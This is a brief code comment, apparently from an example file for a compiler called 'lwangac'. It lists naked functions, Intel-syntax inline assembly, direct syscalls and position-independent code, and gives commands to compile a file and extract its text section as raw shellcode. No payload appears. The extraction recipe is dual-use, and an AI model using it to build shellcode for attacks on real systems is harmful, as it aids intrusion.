//   - Naked functions (no prologue/epilogue)
//   - Inline assembly with Intel syntax
//   - Direct syscall invocation
//   - Position-independent code (PIC)
//
// Compile: lwangac shellcode.lwanga -o shellcode --pic
// Extract: objcopy -O binary -j .text shellcode shellcode.bin
